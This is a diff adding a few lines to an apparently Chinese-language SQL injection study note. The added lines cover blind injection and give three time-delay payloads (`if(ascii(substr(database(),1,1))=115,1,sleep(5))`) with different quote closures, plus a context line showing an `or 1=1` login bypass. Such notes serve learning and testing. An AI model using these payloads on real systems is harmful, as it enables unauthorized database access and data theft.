@@ -318,6 +318,16 @@ mysql> show tables;
 
 再次尝试`") or 1=1 #` 登录成功
 
+3. 同样的，若多次无回显，我们可以尝试布尔型/时间延迟盲注
+
+`admin'and if(ascii(substr(database(),1,1))=115,1,sleep(5))#`失败
+
+`admin" and if(ascii(substr(database(),1,1))=115,1,sleep(5))#`失败
+
+`admin") and if(ascii(substr(database(),1,1))=115,1,sleep(5))#`成功
+
+区别多数取决于闭合用的符号类型: `"` `'"` `')` `")` `'")`
+
 ## SQL数据库的补充知识
 一 基础字符部分
 
